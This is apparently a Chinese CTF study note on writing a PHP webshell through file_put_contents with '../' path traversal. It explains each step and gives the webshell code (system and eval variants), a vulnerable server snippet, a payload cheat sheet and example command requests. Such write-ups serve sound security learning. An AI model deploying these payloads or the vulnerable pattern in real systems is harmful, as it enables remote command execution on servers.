---
title: file_put_contents 写入 webshell
category: 文件上传/写入文件
tags: [file_put_contents, 目录穿越, webshell, 写文件, 路径拼接, 代码执行]
source: PHP 文件操作（file_put_contents）笔记
order: 7
---

## 一句话概括

`file_put_contents($path, $content)` 会**直接以写入模式**把 `$content` 落盘到 `$path`。如果 `$path` 里拼进了用户可控的内容且没过滤 `../`，就能把一段 PHP 代码写到**网站根目录**，凭空生成一个可访问、可传参执行的 webshell —— 相当于绕开"上传点"另开一条写 shell 的路径。

## 本题情景与解题手法

### 题目形态

后端有这样一句（用户可控的部分拼进了**路径**）：

```php
file_put_contents("log-../../shell.php", "<?php system(\$_GET['cmd']); ?>");
```

原笔记的疑问正是：**为什么这句就表示"创建了 `shell.php`，并且可以在它上面传参执行代码"？** 下面拆成三步看。

### 第一步：`../` 目录穿越，把文件写到别处

- 路径是 `log-../../shell.php`，其中 `log-` 是前缀（可能对应"日志文件名"），`../../` 是**目录穿越**；
- 程序从当前目录出发，`../` 退回上级，再来一个 `../` 再退一级；
- 最终在**站点根目录**创建文件 `shell.php`。

关键点：写入位置由**路径字符串**决定。只要路径里能塞进 `../`，就能把文件写到当前目录之外 —— 这也解释了为什么它常被归到"上传点之外的另一条写文件路径"。

### 第二步：写入的内容是合法的 PHP

被写进文件的字符串：

```php
<?php system($_GET['cmd']); ?>
```

这不是普通文本，而是**一段完整、合法、可执行的 PHP 代码**。文件一落盘，服务器后续访问它时就会交给 PHP 解释器执行。

### 第三步：`?cmd=` 传参，把命令送进去

`shell.php` 里的 `$_GET['cmd']` 会从 **URL 查询字符串（Query String）**取值。于是：

```text
http://靶机地址/shell.php?cmd=ls
```

PHP 自动把参数解析成：

```php
$_GET['cmd'] = "ls";
```

代码实际执行的就是：

```php
system("ls");
```

传什么命令，`cmd` 就等于什么 —— 这就是"可以传参"的含义。

### 上传手法一句话总结

> 用户输入被拼进 `file_put_contents` 的**路径** → 用 `../` 目录穿越把文件写到网站根目录 → 写入的内容是合法 PHP 木马 → 访问 `shell.php?cmd=命令` → `$_GET['cmd']` 取值并交给 `system()` 执行。

## 原理

### 1. `file_put_contents` 的行为

```php
file_put_contents(string $filename, mixed $data, int $flags = 0): int|false
```

| 参数 | 含义 |
|---|---|
| `$filename` | 目标**路径**（可含 `../`，支持流封装协议） |
| `$data` | 要写入的**内容**（字符串 / 数组） |
| `$flags` | 可选：`FILE_APPEND`（追加）、`LOCK_EX`（加锁）等 |

它相当于 `fopen + fwrite + fclose` 的简写：**默认覆盖写入**（不加 `FILE_APPEND` 时，同名文件会被直接覆盖）。所以只要路径对，一次调用就能"造出"一个文件。

### 2. 与"普通文件上传"的区别

这正是它值得单独成篇的原因 —— 两者都能落盘一个 webshell，但过关的机制完全不同：

| 对比项 | 普通文件上传 | `file_put_contents` 写文件 |
|---|---|---|
| 触发方式 | 攻击者发 multipart 请求 | **服务端代码主动写** |
| 后缀由谁定 | 攻击者（受校验） | **后端代码写死**，攻击者往往只控路径片段 |
| 要过的校验 | 前端 / 后缀 / MIME / 魔术字节 / 内容 | **这些校验全不经过** |
| 落盘目录 | 通常固定的 `upload/` | 取决于拼接的路径（可穿越） |
| 内容可控性 | 完全可控 | 取决于"被写入的内容"是否可控 |

一句话：**上传要闯"校验关"，而 `file_put_contents` 是开后门直接写**。当上传点被堵死时，它常是另一条突破口。

### 3. 路径穿越（`../`）的原理

文件系统里 `../` 表示"上一级目录"：

```text
/var/www/html/app/logs/    ← 当前目录（cwd 通常在这里）
  log-../../shell.php
     │  └── ../  ──→ /var/www/html/app/logs/../  = /var/www/html/app
     └───── ../  ──→ /var/www/html/app/../       = /var/www/html   ← 网站根目录
                       最终文件：/var/www/html/shell.php
```

只要写入路径由"固定前缀 + 用户输入"拼成，且用户输入里能带 `../`，就会跳出预期目录。防御方式是 `basename()` 取纯文件名、或校验路径不越界。

### 4. 为什么 `$_GET['cmd']` 能"传参"

PHP 的**超全局数组** `$_GET` 会自动收集 URL 查询字符串里的键值对：

```text
shell.php?cmd=ls -la        →  $_GET['cmd'] = "ls -la"
```

`system()` 把字符串当 shell 命令执行，于是"URL 参数"直接变成了"命令"。用 `$_REQUEST` 则连 GET / POST / COOKIE 都能收（更通用，也更危险）。

## 利用条件

1. **写入路径可控**：用户输入被拼进 `file_put_contents`（或 `fopen`/`fwrite`/`file_put_contents` 类）的路径，且未做过滤
2. **能写入可执行后缀**：目标目录里 `shell.php` 这类后缀会被 PHP 解析
3. **写入内容可控或已知可执行**：能写进 PHP 代码（哪怕是间接可控）
4. **文件落在 Web 可访问目录**（如网站根目录），才能从外部访问

## Payload 速查

| 目的 | 写法 |
|---|---|
| 写入到网站根目录 | 路径里用 `../../shell.php` 穿越 |
| 木马内容（GET 传参） | `<?php system($_GET['cmd']); ?>` |
| 木马内容（通用传参） | `<?php @eval($_REQUEST['cmd']); ?>` |
| 追加而非覆盖 | 加 `FILE_APPEND` 标志：`file_put_contents($p, $c, FILE_APPEND)` |
| 访问执行 | `http://靶机地址/shell.php?cmd=ls` |

## 完整示例

服务端（示意）：

```php
<?php
// 用户可控的 $name 被直接拼进路径
$name = $_GET['name'];
file_put_contents("log-" . $name, "<?php system(\$_GET['cmd']); ?>");
?>
```

攻击者让 `$name` 变成 `../../shell.php`，实际写入路径就变成 `log-../../shell.php`（前缀 `log-` 会作为文件名的一部分，不影响 `../` 的效果）。

随后访问：

```http
GET /shell.php?cmd=id HTTP/1.1
Host: 靶机地址
```

等价于服务端执行：

```php
system("id");
```

## 踩坑与备注

- **`../` 能不能用，取决于路径怎么拼**：如果代码是 `file_put_contents("/fixed/dir/" . $name, ...)` 且 `$name` 未过滤，`../` 有效；若代码对 `$name` 做了 `basename()` 或过滤，就写不出去。
- **前缀不影响穿越**：`log-../../shell.php` 里的 `log-` 与 `../` 共同构成文件名字符串，`../` 仍会把工作位置回退，所以穿越照样成立。
- **覆盖风险**：`file_put_contents` 默认覆盖同名文件，可能把已有脚本覆盖掉（既是特性也是风险）。
- **内容可控性不总是满分**：有的题目只让你控路径、不让你控内容，这时要借助"日志写入"等间接方式让内容可控。
- **与上传题的区别要点**：上传靠"绕过校验"，写文件靠"路径拼接 + 目录穿越"。两条路都能拿 webshell，排查时不要只盯上传点。
